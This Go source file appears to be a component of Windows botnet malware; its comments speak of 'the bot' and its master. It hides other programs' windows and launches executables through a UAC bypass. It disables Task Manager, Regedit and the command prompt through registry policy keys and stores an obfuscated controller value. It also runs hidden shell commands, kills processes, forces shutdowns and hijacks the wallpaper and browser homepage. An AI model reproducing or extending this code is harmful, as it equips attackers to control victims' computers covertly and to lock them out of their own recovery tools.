package components

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows/registry"
)

func NewDebugUpdate(message string) {
	if len(message) > 0 {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format(time.RFC850), "] "+message)
	}
}

func hideProcWindow(exe string, active string) { //go components.HideProcWindow("Calculator")
	if active == "true" {
		for {
			time.Sleep(1 * time.Second)
			if checkForProc(exe) {
				_, _, err := procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))
				if err != nil {
				}
			}
		}
	} else {
		if checkForProc(exe) {
			_, _, err := procShowWindow.Call(uintptr(findWindow(exe)), uintptr(0))
			if err != nil {
			}
		}
	}
}

func findWindow(title string) syscall.Handle {
	var hwnd syscall.Handle
	cb := syscall.NewCallback(func(h syscall.Handle, p uintptr) uintptr {
		b := make([]uint16, 200)
		_, err := getWindowText(h, &b[0], int32(len(b)))
		if err != nil {
			return 1
		}
		if strings.Contains(syscall.UTF16ToString(b), title) {
			hwnd = h
			return 0
		}
		return 1
	})
	enumWindows(cb, 0)
	if hwnd == 0 {
		return 0
	}
	return hwnd
}

func enumWindows(enumFunc uintptr, lparam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procEnumWindows.Addr(), 2, uintptr(enumFunc), uintptr(lparam), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func checkForProc(proc string) bool {
	var dst []Win32_Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false
	}
	for _, v := range dst {
		if bytes.Contains([]byte(v.Name), []byte(proc)) {
			return true
		}
	}
	return false
}

func messageBox(title, text string, style uintptr) (result int) {
	//NewDebugUpdate("Displaying MessageBox")
	ret, _, _ := procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		uintptr(style))
	result = int(ret)
	return
}

func randomString(strlen int, icint bool) string { //Generates a random string
	if icint != false {
		rand.Seed(time.Now().UTC().UnixNano())
		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
		result := make([]byte, strlen)
		for i := 0; i < strlen; i++ {
			result[i] = chars[rand.Intn(len(chars))]
		}
		return string(result)
	}
	rand.Seed(time.Now().UTC().UnixNano())
	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
	result := make([]byte, strlen)
	for i := 0; i < strlen; i++ {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func randInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

func goToSleep(sleeptime int) { //Makes the bot sleep
	//NewDebugUpdate("Sleeping for " + string(sleeptime) + " Seconds...")
	time.Sleep(time.Duration(sleeptime) * time.Second)
}

func takeAMoment() {
	time.Sleep(time.Duration(randInt(250, 500)) * time.Millisecond)
}

func openURL(URL string, mode string) { //Opens a URL
	if mode == "0" {
		rsp, _ := http.Get(URL)
		defer rsp.Body.Close()
	} else { //visable
		exec.Command("cmd", "/c", "start", URL).Start()
	}
}

func startEXE(name string, uac string) { //Start an exe; example calc
	if strings.Contains(name, ".exe") {
		if uac == "0" {
			binary, _ := exec.LookPath(name)
			exec.Command(binary).Run()
		} else {
			binary, _ := exec.LookPath(name)
			uacBypass(binary)
		}
	}
}
func powerOptions(mode string) {
	if mode == "0" {
		run("shutdown -s -t 00")
	} else if mode == "1" {
		run("shutdown -r -t 00")
	} else if mode == "2" {
		run("shutdown -l -t 00")
	}
}

func registryToy(val string, opt int) {
	if opt == 0 { //TaskMngr
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", val) //0 = on|1 = off
	} else if opt == 1 { //Regedit
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", val) //0 = on|1 = off
	} else if opt == 2 { //CMD
		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", val) //0 = on|1 = off
	} else if opt == 3 { //Bot ReMaster
		_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER")                //Delete old
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER", obfuscate(val)) //Write new
	} else if opt == 4 { //Change Last known command
		//_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")              //Delete old
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST", md5Hash(val)) //Write new

	}
}

func setBackground(mode string, data string) {
	if mode == "0" { //http.GET
		n := randomString(5, false)
		output, _ := os.Create(tmpPath + n + ".jpg")
		defer output.Close()
		response, _ := http.Get(data)
		defer response.Body.Close()
		_, err := io.Copy(output, response.Body)
		if err == nil {
			ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
			if ret == 1 {
			}
		}
	} else { //Base64
		n := randomString(5, false)
		Image, _ := os.Create(tmpPath + n + ".jpg")
		DecodedImage, _ := base64.StdEncoding.DecodeString(data)
		Image.WriteString(string(DecodedImage))
		Image.Close()
		ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
		if ret == 1 {
		}
	}
}
func setHomepage(url string) {
	_ = writeRegistryKey(registry.CURRENT_USER, homepagePath, "Start Page", url)
}

func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		NewDebugUpdate("Run: " + err.Error())
	}
}

func kill(name string) { //Kill("Tool.exe")
	c := exec.Command("cmd", "/C", "taskkill /F /IM "+name)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
		NewDebugUpdate("Kill: " + err.Error())
	}
}
